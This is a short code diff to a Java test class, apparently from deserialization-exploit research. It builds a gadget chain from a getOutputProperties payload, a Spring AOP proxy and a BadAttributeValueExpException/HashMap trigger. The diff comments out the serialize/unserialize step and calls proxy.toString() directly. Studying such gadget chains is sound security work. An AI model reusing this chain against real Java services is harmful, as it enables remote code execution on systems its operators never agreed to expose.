@@ -22,20 +22,20 @@ public class test {
         Object poc = Reflections.getOutputProperties_payload();
         Object proxy = aop_tools.aop_tostring(poc,"getOutputProperties");
 //        POJONode node = new POJONode(proxy);
-        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
-        setFieldValue(badAttributeValueExpException, "val", proxy);
-        HashMap hashMap = new HashMap();
-        hashMap.put(proxy, badAttributeValueExpException);
-
+//        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
+//        setFieldValue(badAttributeValueExpException, "val", proxy);
+//        HashMap hashMap = new HashMap();
+//        hashMap.put(proxy, badAttributeValueExpException);
+        proxy.toString();
 //        proxy.toString();
 // 2 get ->object.method(param)  代理目标/方法/get参数/传入参数
 //        test_get test1 = new test_get();
 //        Map proxy = (Map) aop_tools.aop_getter(test1,"test","username","AsaL1n");
 //        proxy.get("username");
 
-        serialize(hashMap);
-        unserialize("ser.bin");
-
+//        serialize(hashMap);
+//        unserialize("ser.bin");
+//
 
 
 
